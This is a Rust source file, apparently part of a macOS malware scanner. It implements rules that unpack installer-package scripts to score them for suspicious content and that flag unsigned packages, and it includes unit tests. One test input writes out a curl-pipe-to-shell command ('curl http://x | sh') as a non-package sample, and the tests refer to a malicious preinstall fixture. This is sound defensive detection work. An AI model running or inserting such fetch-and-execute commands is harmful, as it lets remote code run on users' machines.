//! Installer-package (`.pkg`) heuristics (§5.2, §6.1). Two rules, kept in
//! different categories so a package that is both unsigned *and* fetches remote
//! code corroborates across §5.1's two-category requirement:
//!
//! - `installer-script-suspicious` (`StaticSuspicion`) scores the install
//!   scripts' contents;
//! - `unsigned-installer-package` (`ProvenanceConcern`) notes a missing signature.
//!
//! The script rule adds no heuristics of its own: it reaches the script text
//! (xar TOC → heap → gzip → cpio) and hands the bytes to the existing content
//! rules — the container work buys *reach*, not a new detection. Only the named
//! metadata entries are read; `Payload` is left for §6.2's Phase 0b path.

use super::{embedded_content_ruleset, Rule, RuleOutcome};
use crate::context::ScanContext;
use crate::model::{MatchedSignal, SignalCategory};
use crate::scan::scan_embedded_bytes;
use crate::{cpio, xar};

/// Ceiling on what the script rule can contribute — the sub-scan total climbs
/// fast when several markers match, and Phase 0a scoring is a plain sum (§12).
const MAX_SCRIPT_WEIGHT: i32 = 20;

/// Weight for a package with no signature. Well below the notify threshold:
/// plenty of legitimate packages are unsigned (all default `pkgbuild` output).
/// Earns its place by corroborating (§5.1, §5.4).
const UNSIGNED_PACKAGE_WEIGHT: i32 = 6;

/// Scores the contents of a package's install scripts.
pub struct InstallerScriptRule;

impl Rule for InstallerScriptRule {
    fn id(&self) -> &'static str {
        "installer-script-suspicious"
    }

    fn category(&self) -> SignalCategory {
        SignalCategory::StaticSuspicion
    }

    fn evaluate(&self, ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
        let content = ctx.content.as_ref().ok_or(RuleOutcome::NotApplicable)?;
        let limits = xar::XarLimits::default();

        let Some(archive) = xar::parse(content, &limits) else {
            return Ok(None); // not a package
        };
        // Couldn't read in full => "couldn't check", never "clean" (§10, §11.8).
        if !archive.is_complete() {
            return Err(RuleOutcome::NotApplicable);
        }

        let mut findings: Vec<String> = Vec::new();
        let mut total: i32 = 0;
        let mut saw_scripts = false;

        for entry in archive.metadata_entries() {
            if entry.name != "Scripts" {
                continue;
            }
            saw_scripts = true;

            // An entry we can't reach (bounded read stopped short) is
            // unreadable, not absent.
            let raw = xar::read_entry(content, &archive, entry, &limits)
                .map_err(|_| RuleOutcome::NotApplicable)?;

            // Scripts is normally gzip-wrapped cpio; if not gzip, `read_entry`
            // already undid the heap encoding.
            let archive_bytes = match crate::inflate::gzip_decompress(&raw, limits.max_entry_bytes)
            {
                Ok(v) => v,
                Err(_) => raw,
            };

            let Some(members) = cpio::parse(&archive_bytes, &cpio::CpioLimits::default()) else {
                // Something is in there, but not in a shape we can read.
                return Err(RuleOutcome::NotApplicable);
            };
            if !members.is_complete() {
                return Err(RuleOutcome::NotApplicable);
            }

            for member in &members.entries {
                if !member.is_regular_file() || member.data.is_empty() {
                    continue;
                }
                let label = format!("{}!{}/{}", ctx.path.display(), entry.path, member.name);
                let result = scan_embedded_bytes(
                    label,
                    member.data.to_vec(),
                    false,
                    &embedded_content_ruleset(),
                );
                for signal in &result.signals {
                    total = total.saturating_add(signal.weight);
                    findings.push(format!(
                        "install script {}: {}",
                        member.name, signal.description
                    ));
                }
            }
        }

        // No scripts at all, or scripts that scored nothing: a clean read.
        if !saw_scripts || findings.is_empty() || total <= 0 {
            return Ok(None);
        }

        Ok(Some(MatchedSignal {
            id: self.id().to_string(),
            weight: total.min(MAX_SCRIPT_WEIGHT),
            description: findings.join("; "),
            category: self.category(),
        }))
    }
}

/// Notes an installer package that carries no signature.
pub struct UnsignedPackageRule;

impl Rule for UnsignedPackageRule {
    fn id(&self) -> &'static str {
        "unsigned-installer-package"
    }

    fn category(&self) -> SignalCategory {
        SignalCategory::ProvenanceConcern
    }

    fn evaluate(&self, ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
        let content = ctx.content.as_ref().ok_or(RuleOutcome::NotApplicable)?;

        let Some(archive) = xar::parse(content, &xar::XarLimits::default()) else {
            return Ok(None); // not a package
        };
        if !archive.is_complete() {
            return Err(RuleOutcome::NotApplicable);
        }
        if archive.signature.is_some() {
            // Present but not verified — validity is a Security.framework
            // question (§5.2), beyond what this parser establishes.
            return Ok(None);
        }

        Ok(Some(MatchedSignal {
            id: self.id().to_string(),
            weight: UNSIGNED_PACKAGE_WEIGHT,
            description: "installer package carries no signature".to_string(),
            category: self.category(),
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::context::{ContentSource, ScanContext};
    use std::path::PathBuf;

    macro_rules! pkg {
        ($name:literal) => {
            include_bytes!(concat!("../../testdata/xar/", $name, ".pkg")).as_slice()
        };
    }

    fn ctx(name: &str, body: &[u8]) -> ScanContext {
        ScanContext {
            path: PathBuf::from(name),
            content: Some(body.to_vec()),
            truncated: false,
            file_len: Some(body.len() as u64),
            source: ContentSource::File,
        }
    }

    #[test]
    fn a_malicious_preinstall_is_found_through_the_container() {
        let c = ctx("suspicious.pkg", pkg!("suspicious"));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("rule should evaluate")
            .expect("should fire on a curl-pipe-to-shell preinstall");

        assert_eq!(signal.id, "installer-script-suspicious");
        assert_eq!(signal.category, SignalCategory::StaticSuspicion);
        assert!(signal.weight > 0 && signal.weight <= MAX_SCRIPT_WEIGHT);
        // The description names the script member (§5.5).
        assert!(
            signal.description.contains("preinstall"),
            "{}",
            signal.description
        );
        assert!(
            signal.description.contains("curl"),
            "{}",
            signal.description
        );
    }

    /// An ordinary package must score nothing here (§1) — the reason the rule
    /// reuses the content rules rather than flagging "has scripts".
    #[test]
    fn an_ordinary_package_with_scripts_scores_nothing() {
        let c = ctx("benign.pkg", pkg!("benign"));
        assert!(
            matches!(InstallerScriptRule.evaluate(&c), Ok(None)),
            "a package whose postinstall just touches a file must not score"
        );
    }

    #[test]
    fn a_package_without_scripts_scores_nothing() {
        let c = ctx("noscripts.pkg", pkg!("noscripts"));
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
    }

    /// A nested package's scripts still run at install time.
    #[test]
    fn scripts_inside_a_nested_package_are_reached() {
        let c = ctx("product.pkg", pkg!("product"));
        // product.pkg wraps the benign package, whose scripts are clean.
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
    }

    #[test]
    fn non_packages_are_not_this_rules_concern() {
        for (name, body) in [
            ("notes.txt", b"just some text".as_slice()),
            ("script.sh", b"#!/bin/sh\ncurl http://x | sh\n".as_slice()),
            ("empty", b"".as_slice()),
        ] {
            assert!(
                matches!(InstallerScriptRule.evaluate(&ctx(name, body)), Ok(None)),
                "{name}"
            );
            assert!(
                matches!(UnsignedPackageRule.evaluate(&ctx(name, body)), Ok(None)),
                "{name}"
            );
        }
    }

    /// A container we couldn't read in full must degrade completeness, not pass clean.
    #[test]
    fn an_unreadable_package_is_not_applicable() {
        let full = pkg!("benign");
        // Truncated so the TOC's byte range is no longer present.
        let c = ctx("benign.pkg", &full[..40]);
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
        assert!(matches!(
            UnsignedPackageRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
    }

    #[test]
    fn pkgbuild_output_is_unsigned() {
        let c = ctx("benign.pkg", pkg!("benign"));
        let signal = UnsignedPackageRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("pkgbuild output carries no signature");
        assert_eq!(signal.id, "unsigned-installer-package");
        assert_eq!(signal.category, SignalCategory::ProvenanceConcern);
        assert!(signal.weight < 15, "must not alert on its own");
    }

    /// Different categories on purpose — see module docs.
    #[test]
    fn the_two_package_rules_are_independent_categories() {
        assert_ne!(
            InstallerScriptRule.category(),
            UnsignedPackageRule.category()
        );
    }
}
